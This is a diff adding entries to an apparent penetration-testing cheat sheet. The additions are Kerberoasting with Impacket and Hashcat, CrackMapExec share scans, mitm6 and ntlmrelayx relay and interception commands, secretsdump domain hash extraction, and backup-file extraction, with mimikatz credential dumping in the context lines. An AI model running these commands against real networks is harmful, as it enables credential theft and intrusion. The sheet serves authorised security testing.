@@ -66,6 +66,21 @@ Note: parse output above for live hosts before port scanning to save time.
 ### Execute a command via SMB
 `smbmap -H <target> -u <username> -p <password> -d <domain> -x <command>`
 
+## Impacket
+### Enumerate SPNs (requires user creds)
+`impacket-GetUserSPNs -request -dc-ip 192.168.2.160 <fulldomain>/<user>`
+
+Crack in Hashcat with -m 13100
+
+## CrackMapExec
+### Scan for unauthenticated shares on target
+`cme smb <target> -u '' -p '' --shares`
+
+### Scan for authenticated shares on target
+`cme smb <target> -u <username> -p <password> --shares`
+
+[https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference)
+
 ## Cewl
 ### Generate word and email lists from page
 `cewl -w <wordsoutputfile> -a -e --email_file <emailsoutputfile> -v <target>`
@@ -80,6 +95,22 @@ Note: parse output above for live hosts before port scanning to save time.
 
 ### Removing line breaks and inserting commas for Nmap port specification
 `sed -n -e 'H;${x;s/\n/,/g;s/^,//;p;}' < <inputfile>`
+
+# Interception
+
+## Bettercap
+
+## mitm6
+`mitm6 -d <fulldomain>`
+
+Can run with Responder to get hashes when LLMNR is disabled.
+
+Or, relies on ntlmrelayx running with appropriate settings:
+
+## ntlmrelayx
+`ntlmrelayx.py -6 -wh <attackerip> -t smb://<targetip> -l <path/to/loot> -socks -debug`
+
+Can also be used to execute commands.
 
 # Automation
 ## Bash
@@ -105,7 +136,6 @@ done
 
 Useful date/time variables to include in file names:
 $(date +%Y-%m-%d-%H-%M-%S)
-
 
 ## Windows CLI
 ### Ping scan /24 range via loop
@@ -173,6 +203,9 @@ on beacon_initial {
 ## Seclists
 [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
 
+## Crackstation
+[https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
+
 # SSL/TLS interdiction evasion
 ## DomainGain
 Use to identify an expired domain categorized as a non-interdicted category (e.g., healthcare).
@@ -219,6 +252,11 @@ Obfuscate all the things, drop into batch/hta/whatever.
 </script>
 <body onload="a">
 ```
+# Privilege Escalation
+
+## PrivExchange
+[https://github.com/dirkjanm/PrivExchange](https://github.com/dirkjanm/PrivExchange)
+
 
 # Post-exploitation
 
@@ -267,5 +305,17 @@ Save the output file for parsing offline with mimikatz.
 `privilege::debug`
 
 `sekurlsa::logonPasswords full`
+
+#### Secretsdump.py
+`secretsdump.py -just-dc-ntlm <fulldomain</<user>@<ipaddress>`
+
+#### Extracting Files from .kbf (NTBackup) files
+
+[https://github.com/sjmurdoch/mtftar](https://github.com/sjmurdoch/mtftar) (works on Linux)
+```
+mtftar < backup.bkf | tar xvf -
+```
+
+
 
 More to come...
